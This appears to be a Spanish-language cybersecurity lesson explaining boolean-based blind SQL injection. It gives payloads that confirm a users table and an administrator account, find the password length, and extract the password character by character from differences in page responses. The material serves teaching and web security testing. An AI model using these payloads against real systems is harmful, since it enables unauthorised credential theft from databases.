---
title: Inyecciones SQL basadas en condicionales
description: Explicación de las inyecciones SQL basadas en condicionales.
layout: academia_lesson
parent: /academia/ciberseguridad/documentacion/auditorias-web/inyecciones/inyecciones-sql/segun-el-canal-de-comunicacion/ciegas/
author: ElStitchMalo
date: 16/12/2025
updated:
tags: [inyecciones SQL basadas en condicionales]
---

Esta técnica transforma consultas en afirmaciones verdadero/falso que el servidor evalúa. 

El atacante compara respuestas para condiciones que sabe que deberían ser verdaderas o falsas (por ejemplo `AND 1=1` o `AND 1=2`) y, si la respuesta difiere (observando cambios en la respuesta HTTP), puede deducir información.

### Señales a observar

- Diferencias en fragmentos estáticos del HTML.
- Cambios en el código HTTP o redirecciones.
- Presencia/ausencia de elementos DOM concretos.

### Ejemplos de ataque

Supongamos que queremos obtener la contraseña del usuario `administrator`, primero comprobamos que existe una tabla llamada `users` o similar en la base de datos y que tiene al menos una fila.

~~~ 
# PostgreSQL, MySQL

' AND (SELECT 'a' FROM users LIMIT 1)='a
~~~

A continuación verificamos que existe el usuario `administrator` en la tabla `users`.

~~~ 
# PostgreSQL, MySQL, Microsoft, Oracle

' AND (SELECT 'a' FROM users WHERE username='administrator')='a
~~~

Determinamos cuantos caracteres tiene la contraseña del usuario `administrator`.

~~~
# PostgreSQL, Oracle

' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=1)='a
~~~

Ahora que ya sabemos que hay una tabla llamada `users` con las columnas `username` y `password`, y que existe un usuario llamado `administrator` del cual conocemos el numero de caracteres que tiene su contraseña. Podemos determinar la contraseña de este usuario enviándole una serie de entradas para probarla carácter por carácter.

~~~
# PostgreSQL, MySQL, Microsoft

' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
~~~

Esto porvoca un cambio visible en la página, lo que indica que la condición inyectada es verdadera y, por lo tanto, el primer carácter de la contraseña es mayor que `m`.

A continuación, enviamos la siguiente entrada:

~~~
# PostgreSQL, MySQL, Microsoft

' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
~~~

Esto no porvoca un cambio visible en la página, lo que indica que la condición inyectada es falsa y, por lo tanto, el primer carácter de la contraseña no es mayor que `t`.

Finalmente, enviamos la siguiente entrada, que porvoca un cambio visible en la página, confirmando así que el primer carácter de la contraseña es s:

~~~
# PostgreSQL, MySQL, Microsoft

' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
~~~

Podemos continuar este proceso para determinar sistemáticamente la contraseña completa del usuario `Administrator`.
